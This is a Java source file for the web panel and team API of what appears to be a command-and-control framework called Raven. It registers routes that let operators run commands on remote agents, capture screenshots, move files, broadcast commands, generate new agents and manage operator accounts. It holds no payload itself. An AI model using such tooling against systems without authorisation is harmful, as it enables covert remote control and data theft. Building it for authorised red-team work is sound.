package com.raven.interfaces.APP;

import com.raven.core.database.TeamDatabase;
import com.raven.core.event.EventManager.EventType;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.interfaces.APP.api.AgentApi;
import com.raven.interfaces.APP.api.AgentGenApi;
import com.raven.interfaces.APP.api.AuthApi;
import com.raven.interfaces.APP.api.BroadcastApi;
import com.raven.interfaces.APP.api.ChatApi;
import com.raven.interfaces.APP.api.HistoryApi;
import com.raven.interfaces.APP.api.LogsApi;
import com.raven.interfaces.APP.api.OperatorApi;
import com.raven.interfaces.APP.api.ServerApi;
import com.raven.interfaces.APP.core.HttpRouter;
import com.raven.interfaces.APP.core.WebLogger;
import com.raven.interfaces.APP.core.WebServerManager;
import com.raven.interfaces.APP.shared.PathResolver;
import com.raven.utils.ServerConfig;
import com.sun.net.httpserver.HttpServer;
import java.net.InetSocketAddress;
import java.time.Instant;
import java.util.Map;
import java.util.concurrent.Executors;

public final class WebApp {

    private final ServerConfig Config;
    private final ListenerMode ActiveMode;
    private final TeamDatabase Database;
    private boolean ApiOnly = false;

    private final WebLogger WebLogger;
    private final WebServerManager ServerManager;
    private final PathResolver PathResolver;

    private final AuthApi AuthApi;
    private final ServerApi ServerApiHandler;
    private final AgentApi AgentApiHandler;
    private final BroadcastApi BroadcastApiHandler;
    private final HistoryApi HistoryApiHandler;
    private final LogsApi LogsApiHandler;
    private final OperatorApi OperatorApiHandler;
    private final ChatApi ChatApiHandler;
    private final AgentGenApi AgentGenApiHandler;

    private HttpServer HttpSrv;

    public WebApp(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.ActiveMode = Mode;
        this.Database = TeamDatabase.Connect(Config);

        WebLogger = new WebLogger(Config.GetMaxLogEntries(), Database);
        ServerManager = new WebServerManager(Config, Mode, WebLogger);
        PathResolver = new PathResolver(WebApp.class);

        AuthApi = new AuthApi(Database);
        ServerApiHandler = new ServerApi(Config, ServerManager);
        AgentApiHandler = new AgentApi(ServerManager, Database, WebLogger);
        BroadcastApiHandler = new BroadcastApi(ServerManager, Database, WebLogger);
        HistoryApiHandler = new HistoryApi(Database);
        LogsApiHandler = new LogsApi(WebLogger);
        OperatorApiHandler = new OperatorApi(Database, WebLogger, AuthApi);
        ChatApiHandler = new ChatApi(Database);
        AgentGenApiHandler = new AgentGenApi(Config);
    }

    public void AttachServer(RavenServer Server, Instant ServerStartTime) {
        ServerManager.AttachServer(Server, ServerStartTime);
    }

    public WebApp SetApiOnly(boolean Value) {
        this.ApiOnly = Value;
        return this;
    }

    public void Run(String Host, int Port) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 100);
        HttpRouter Router = new HttpRouter(HttpSrv, Config, PathResolver);

        Router.Register("/api/auth/login", AuthApi::Login);
        Router.Register("/api/auth/logout", AuthApi::Logout);
        Router.Register("/api/server/status", ServerApiHandler::Status);
        Router.Register("/api/server/start", ServerApiHandler::Start);
        Router.Register("/api/server/stop", ServerApiHandler::Stop);
        Router.Register("/api/agents", AgentApiHandler::List);
        Router.Register("/api/agents/kill", AgentApiHandler::Kill);
        Router.Register("/api/agents/note", AgentApiHandler::SetNote);
        Router.Register("/api/agents/screenshot", AgentApiHandler::Screenshot);
        Router.Register("/api/agents/download", AgentApiHandler::Download);
        Router.Register("/api/agents/upload", AgentApiHandler::Upload);
        Router.Register("/api/command/execute", AgentApiHandler::Execute);
        Router.Register("/api/command/broadcast", BroadcastApiHandler::Broadcast);
        Router.Register("/api/command/broadcastall", BroadcastApiHandler::BroadcastAll);
        Router.Register("/api/command/history", HistoryApiHandler::CommandHistory);
        Router.Register("/api/sessions/history", HistoryApiHandler::SessionHistory);
        Router.Register("/api/logs", LogsApiHandler::GetLogs);
        Router.Register("/api/logs/clear", LogsApiHandler::ClearLogs);
        Router.Register("/api/team/operators", OperatorApiHandler::GetOperators);
        Router.Register("/api/team/operators/create", OperatorApiHandler::Create);
        Router.Register("/api/team/operators/role", OperatorApiHandler::UpdateRole);
        Router.Register("/api/team/operators/password", OperatorApiHandler::UpdatePassword);
        Router.Register("/api/team/operators/delete", OperatorApiHandler::Delete);
        Router.Register("/api/team/operators/kick", OperatorApiHandler::Kick);
        Router.Register("/api/team/roles", OperatorApiHandler::GetRoles);
        Router.Register("/api/chat/send", ChatApiHandler::Send);
        Router.Register("/api/chat/history", ChatApiHandler::History);
        Router.Register("/api/agent/generate", AgentGenApiHandler::Generate);
        Router.Register("/api/agent/list", AgentGenApiHandler::ListAgents);
        if (!ApiOnly) {
            Router.RegisterStatic();
        }

        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();

        if (ApiOnly) {
            Logger.Info("TeamClient API listening on http://" + Host + ":" + Port + " — operators connect with: -TC -ts " + Host + " -tp " + Port);
        } else {
            Logger.Info("Web panel started on http://" + Host + ":" + Port);
            Logger.Verbose("Static Dir : " + PathResolver.ResolvePath(Config.GetStaticDir()));
            Logger.Verbose("Template Dir: " + PathResolver.ResolvePath(Config.GetTemplateDir()));
        }
        WebLogger.Add("=".repeat(70));
        WebLogger.Add((ApiOnly ? "RAVEN TEAMCLIENT API" : "RAVEN WEB PANEL") + " INITIALIZED — MODE: " + ActiveMode.name());
        WebLogger.Add("=".repeat(70));

        ServerManager.StartIfNeeded(this::OnEvent);
    }

    public void Stop() {
        ServerManager.Stop();
        try {
            if (HttpSrv != null) HttpSrv.stop(1);
        } catch (Exception Ignored) {}
        HttpSrv = null;
        Logger.Info("Web panel stopped");
    }

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                WebLogger.Add("SESSION-" + Data.get("ID") + " [" + Data.get("Type") + "] " + Data.get("User") + "@" + Data.get("Hostname") + " " + Data.get("OS"));
                Database.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                WebLogger.Add("SESSION-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Database.SaveSessionEvent(Data, "disconnected");
            }
            case Error -> WebLogger.Add("Error: " + Data.get("Message"));
        }
    }
}
